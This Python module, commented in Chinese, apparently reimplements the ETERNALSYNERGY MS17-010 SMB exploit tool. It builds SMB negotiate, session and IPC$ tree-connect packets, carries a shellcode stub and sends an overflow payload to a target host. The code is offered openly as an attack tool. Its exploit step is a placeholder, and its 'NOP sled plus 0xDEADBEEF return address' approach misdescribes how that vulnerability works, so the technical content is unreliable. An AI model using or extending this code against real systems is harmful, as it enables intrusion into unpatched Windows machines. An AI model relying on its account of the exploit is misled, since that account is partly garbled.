"""eternal_synergy — ETERNALSYNERGY (ETESYNERGY / MS17-010) 利用核心逻辑。

Python 重写的 `Eternalsynergy-1.0.1.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 SMBv1/MS17-010 利用流程。

参数定义来源：Eternalsynergy-1.0.1.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_MAX_LEAK_ATTEMPTS = 7
DEFAULT_MAX_EXPLOIT_ATTEMPTS = 3
DEFAULT_ATTEMPT_INDEX = 0

EXPLOIT_METHOD_VALUES = {
    "Default":        0,
    "Matched-pairs":  1,
    "Classic-Synergy": 2,
}

CREDENTIAL_TYPE_VALUES = {
    "Anonymous": 0,
    "Guest":     2,
    "Blank":     2,
    "Password":  3,
    "NTLM":      4,
}

TARGET_OS_VALUES = {
    "WIN8_SP0":    {"OsMajor": 6, "OsMinor": 2, "OsServicePack": 0},
    "SERVER_2K12_SP0": {"OsMajor": 6, "OsMinor": 2, "OsServicePack": 0},
}

# EternalSynergy exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
ETESYNERGY_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EternalSynergyError(Exception):
    pass


def _parse_hex_buffer(value):
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EternalSynergyError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EternalSynergyError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_smb_negotiate_request():
    command = 0x72
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x00" + struct.pack("<H", len(dialects)) + dialects
    )
    return smb


def build_session_setup_request():
    command = 0x73
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x0d" + b"\xff" + b"\x00"
        + struct.pack("<H", 0) + struct.pack("<H", 0)
        + struct.pack("<H", 4096) + struct.pack("<H", 0)
        + struct.pack("<I", 0) + struct.pack("<I", 0)
        + struct.pack("<H", 0) + struct.pack("<I", 0) + struct.pack("<H", 0)
    )
    return smb


def build_tree_connect_request(share_name=b"IPC$"):
    command = 0x75
    share = share_name + b"\x00"
    password = b"\x00"
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x04" + b"\xff" + b"\x00"
        + struct.pack("<H", 0) + struct.pack("<H", 1)
        + struct.pack("<H", len(password)) + struct.pack("<H", len(share))
        + struct.pack("<H", 0) + password + share
    )
    return smb


def build_eternal_synergy_overflow(shellcode, target_os):
    """构建 ETERNALSYNERGY 缓冲区溢出负载。

    根据 x32dbg 分析，ETERNALSYNERGY 通过向目标发送特制的 SMBv1
    NT_TRANSACT 请求，触发非分页池溢出，利用 DOPU shellcode 执行任意代码。
    """
    os_info = TARGET_OS_VALUES.get(target_os, TARGET_OS_VALUES["WIN8_SP0"])

    # 构建基于 OS 版本的溢出体（占位符，需 x32dbg 恢复真实字节）
    nopsled = b"\x90" * 256
    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复
    return nopsled + ret_addr + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    max_leak_attempts=DEFAULT_MAX_LEAK_ATTEMPTS,
    max_exploit_attempts=DEFAULT_MAX_EXPLOIT_ATTEMPTS,
    attempt_index=DEFAULT_ATTEMPT_INDEX,
    many_core_target=False,
    pipe=None,
    exploit_method="Default",
    shellcode_file=None,
    credentials="Anonymous",
    username=None,
    password=None,
    ntlm_hash=None,
    lm_hash=None,
    target_os="WIN8_SP0",
    verbose=False,
):
    """执行 ETERNALSYNERGY 利用序列。

    阶段：
      1. TCP 连接到目标 SMB 端口
      2. 发送 SMB 协商请求
      3. 会话设置 (SESSION_SETUP_ANDX)
      4. 树连接 (TREE_CONNECT_ANDX) 到 IPC$
      5. 构建并发送 ETERNALSYNERGY 事务泄漏 + 内存劫持负载
      6. 架构识别（x86/x64）
      7. DOPU shellcode 注入（x64 专用）
      8. 验证目标是否易受攻击
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Max leak attempts: {max_leak_attempts}")
        print(f"[*] Max exploit attempts: {max_exploit_attempts}")
        print(f"[*] Attempt index: {attempt_index}")
        print(f"[*] Many core target: {many_core_target}")
        print(f"[*] Exploit method: {exploit_method}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Credentials: {credentials}")
        if shellcode_file:
            print(f"[*] Shellcode file: {shellcode_file}")
        if pipe:
            print(f"[*] Pipe: {pipe}")

    exploit_method_value = EXPLOIT_METHOD_VALUES.get(exploit_method, 0)
    credentials_value = CREDENTIAL_TYPE_VALUES.get(credentials, 0)
    target_os_info = TARGET_OS_VALUES.get(target_os, TARGET_OS_VALUES["WIN8_SP0"])

    username_bytes = _parse_hex_buffer(username)
    password_bytes = _parse_hex_buffer(password)
    ntlm_hash_bytes = _parse_hex_buffer(ntlm_hash)
    lm_hash_bytes = _parse_hex_buffer(lm_hash)

    if verbose:
        print(f"[*] Exploit method value: {exploit_method_value}")
        print(f"[*] Credentials value: {credentials_value}")
        print(f"[*] Username: {len(username_bytes)} bytes")
        print(f"[*] Password: {len(password_bytes)} bytes")
        print(f"[*] NTLM hash: {len(ntlm_hash_bytes)} bytes")
        print(f"[*] LM hash: {len(lm_hash_bytes)} bytes")
        print(f"[*] Target OS: OsMajor={target_os_info['OsMajor']}, "
              f"OsMinor={target_os_info['OsMinor']}, "
              f"OsServicePack={target_os_info['OsServicePack']}")

    # 建立 TCP 连接（SMB 445）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EternalSynergyError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 发送 SMB 协商请求
        negotiate = build_smb_negotiate_request()
        sock.sendall(negotiate)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] SMB 协商应答: {resp.hex()[:128] if resp else '无'}")

        if not resp or resp[4:7] != b"SMB":
            raise EternalSynergyError("目标未返回有效的 SMB 应答")

        # 发送会话设置请求（匿名会话）
        session_setup = build_session_setup_request()
        sock.sendall(session_setup)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] 会话设置应答: {resp.hex()[:128] if resp else '无'}")

        # 连接到 IPC$ 共享
        tree_connect = build_tree_connect_request(b"IPC$")
        sock.sendall(tree_connect)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] 树连接应答: {resp.hex()[:128] if resp else '无'}")

        # 加载 shellcode 文件（若提供）
        shellcode = ETESYNERGY_SHELLCODE_PLACEHOLDER
        if shellcode_file:
            try:
                with open(shellcode_file, "rb") as fh:
                    shellcode = fh.read()
                if verbose:
                    print(f"[+] 载荷文件: {len(shellcode)} 字节")
            except OSError as exc:
                if verbose:
                    print(f"[-] 无法读取载荷文件: {exc}")

        # 构建 ETERNALSYNERGY 溢出负载
        overflow = build_eternal_synergy_overflow(shellcode, target_os)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] ETERNALSYNERGY 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
